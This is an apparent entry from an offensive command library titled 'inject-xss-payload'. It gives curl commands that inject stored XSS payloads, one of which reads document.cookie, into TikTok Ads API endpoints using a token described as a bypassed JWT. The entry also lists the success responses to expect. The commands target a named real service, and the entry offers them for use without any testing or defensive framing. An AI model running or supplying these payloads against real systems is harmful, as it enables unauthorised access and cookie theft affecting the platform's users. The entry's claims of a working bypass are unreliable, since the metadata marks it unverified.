---
data: >-
  curl -X POST -H "Authorization: Bearer $(cat malicious.jwt)" -d
  'description=<script>alert("XSS via JWT Bypass")</script>'
  https://ads.tiktok.com/api/submit-ad
tags:
  - xss
  - injection
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 2a7ade8a-9e14-4656-8e2c-b11f5abc6676
created_at: '2025-12-14T17:30:58.259Z'
updated_at: '2025-12-14T17:30:58.259Z'
verified: false
validated: true
submitted: true
---
# inject-xss-payload

## Command

```bash
curl -X POST -H "Authorization: Bearer $(cat malicious.jwt)" -d 'description=<script>alert("XSS via JWT Bypass")</script>' https://ads.tiktok.com/api/submit-ad
```

## Description

This curl command injects a stored XSS payload into a TikTok Ads API endpoint using a bypassed JWT for authentication, exploiting lack of input sanitization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H` | Authorization header with JWT | Yes |
| `-d` | Payload data with script | Yes |
| URL | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'title=<script>alert(1)</script>' https://example.com/api
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: application/json" -d '{"desc":"<img src=x onerror=alert(document.cookie)>"}' https://ads.tiktok.com/api
```

## Expected Output

HTTP 201 Created or 200 OK with confirmation, e.g., {"id":123,"status":"submitted"}.

## Related

- [[Related Procedure|procedures/Stored-XSS-Injection-via-Bypassed-Access]]
